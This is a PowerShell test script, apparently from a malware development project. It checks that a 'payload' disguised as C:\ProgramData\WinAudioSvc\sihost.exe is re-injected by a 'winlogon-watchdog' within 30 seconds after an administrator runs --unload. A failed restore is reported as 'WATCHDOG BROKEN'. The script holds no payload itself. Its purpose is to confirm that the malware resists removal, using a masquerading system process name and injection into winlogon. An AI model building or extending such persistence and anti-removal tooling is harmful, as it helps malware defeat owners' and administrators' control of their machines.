# Test the "admin cooperative --unload triggers winlogon-watchdog auto-reinject"
# invariant. If admin --unload works, we better come back within seconds.
# Otherwise the destructive-only mandate is violated.
$ErrorActionPreference='Continue'

Write-Host "=== pre: verify payload alive ==="
& 'C:\ProgramData\WinAudioSvc\sihost.exe' --status
$pre = $LASTEXITCODE
Write-Host "pre exit=$pre  (0=loaded)"

if ($pre -ne 0) { Write-Host "payload not alive to start with -- aborting test"; exit 1 }

Write-Host ""
Write-Host "=== fire: admin --unload ==="
$p = Start-Process -FilePath 'C:\ProgramData\WinAudioSvc\sihost.exe' -ArgumentList '--unload' -Wait -PassThru -WindowStyle Hidden
Write-Host "  unload exit=$($p.ExitCode)"

Write-Host ""
Write-Host "=== immediate post-unload status (payload should be dying/dead) ==="
Start-Sleep -Milliseconds 500
& 'C:\ProgramData\WinAudioSvc\sihost.exe' --status
Write-Host "  post-500ms exit=$LASTEXITCODE"

Write-Host ""
Write-Host "=== watching for winlogon-watchdog auto-reinject (up to 30s) ==="
for ($t = 1; $t -le 30; $t++) {
    Start-Sleep -Seconds 1
    & 'C:\ProgramData\WinAudioSvc\sihost.exe' --status | Out-Null
    if ($LASTEXITCODE -eq 0) {
        Write-Host "  T+${t}s: RESTORED (payload loaded again via watchdog)"
        Write-Host ""
        Write-Host "=== VERDICT: admin non-destructive unload is TRANSIENT (watchdog restores) ==="
        exit 0
    }
    Write-Host "  T+${t}s: still gone"
}
Write-Host ""
Write-Host "=== VERDICT: admin --unload was PERMANENT for 30+ seconds. WATCHDOG BROKEN. ==="
exit 7
